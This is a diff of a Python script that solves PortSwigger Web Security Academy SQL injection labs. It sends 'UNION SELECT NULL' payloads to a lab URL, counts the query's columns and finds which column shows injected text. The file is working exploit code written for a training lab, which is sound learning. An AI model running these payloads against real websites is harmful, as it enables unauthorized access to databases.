@@ -1,49 +1,114 @@
 #!/usr/bin/env python3
 import requests
 import sys
+from bs4 import BeautifulSoup
+import re
 
-# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
 
 # API Parameters
-url = 'https://abcd.web-security-academy.net/page'
+url = 'https://abcd.web-security-academy.net/'
+url = f'{url}page'
 params = {'category': 'Lifestyle'}
-null = ["'UNION", 'SELECT', 'NULL', '--']
+null = ["'UNION SELECT", 'NULL', '--']
 sqli = {'category': f"Lifestyle{' '.join(null)}"}
 
 # API Request
 api_session = requests.Session()
-response = api_session.get(url, params=sqli)
+response = api_session.get(url, params=params)
 
 if response.status_code == 404:
     sys.exit('The session you are looking for has expired')
 
 
-def sqli_union_1_lab(response):
-    while not response.ok:
-        null.pop(-1)
+def sqli_union_lab_1(null, sqli):
+    """
+    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
+    :param null: Copy of global null variable
+    :param sqli: Copy of global sqli variable
+    :return:
+    """
+    # Perform a new requests with sqli parameters
+    lab1 = api_session.get(url, params=sqli)
+
+    while not lab1.ok:
+        # Remove '--' then add ', NULL --' until lab1.ok is True
+        null.remove('--')
         null.extend([',', 'NULL', '--'])
+
+        # Perform a new request with the updated list
         sqli['category'] = f"Lifestyle{' '.join(null)}"
-        response = api_session.get(url, params=sqli)
+        lab1 = api_session.get(url, params=sqli)
+
     print(f"There are {null.count('NULL')} columns")
 
+    # Return null since it now has the amount of NULL's required to exploit the application
     return null
 
 
-def sqli_union_2_lab(response, null):
+def sqli_union_lab_2(lab2, null, sqli):
+    """
+    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value
+    provided.
+    :param lab2: Global response variable
+    :param null: Copy of global null variable
+    :param sqli: Copy of global sqli variable
+    :return:
+    """
+    # Parse the HTML output using Beautiful Soup to grab the secret value
+    html = BeautifulSoup(lab2.text, 'html.parser')
+    secret_string = html.find('p', {'id': 'hint'}).contents[0]
+    secret_value = re.search("['].*[']", secret_string)
+
+    # Perform a new request with sqli parameters
+    lab2 = api_session.get(url, params=sqli)
+    # Initialize column variable for accurate column count
+    column = 1
+    # Retrieve the location of the first 'NULL'
     step = null.index('NULL')
-    column = 0
-    while not response.ok:
+
+    while not lab2.ok:
+        # Replace each NULL with the secret_value until lab2.ok is True.
         index = null.index('NULL', step)
-        step = (index + 1)
-        column += 1
-        null[index] = "'VULNERABLE_STRING'"
+        null[index] = secret_value[0]
+
+        # Perform a new request with the updated parameters
         sqli['category'] = f"Lifestyle{' '.join(null)}"
-        response = api_session.get(url, params=sqli)
-        null[index] = "NULL"
+        lab2 = api_session.get(url, params=sqli)
+
+        if not lab2.ok:
+            # Replace the secret_value with NULL if lab2.ok is still False
+            null[index] = "NULL"
+            # Increase step by 1 to find the next NULL
+            step = (index + 1)
+            # Increase column by 1 for accurate column count
+            column += 1
     print(f'Column {column} contains inserted text')
+
+    # Return the index where the secret value appeared within the query results
+    return index
+
+    ### ALTERNATIVE TO WHILE LOOP ###
+    # # Find all indexes where the value is NULL
+    # only_null = [index for index, value in enumerate(null) if value == 'NULL']
+    #
+    # for index in only_null:
+    #     while not lab2.ok:
+    #         null[index] = secret_value[0]
+    #         sqli['category'] = f"Lifestyle{' '.join(null)}"
+    #         lab2 = api_session.get(url, params=sqli)
+    #
+    #         if not lab2.ok:
+    #             null[index] = "NULL"
+    #             column += 1
+    #         break
+    # else:
+    #     print(f'Column {column} contains inserted text')
+    #
+    # # Return the index where the secret value appeared within the query results
+    # return null.index(secret_value[0])
 
 
 if __name__ == '__main__':
-
-    null = sqli_union_1_lab(response=response)
-    sqli_union_2_lab(response=response, null=null)
+    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
+    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())
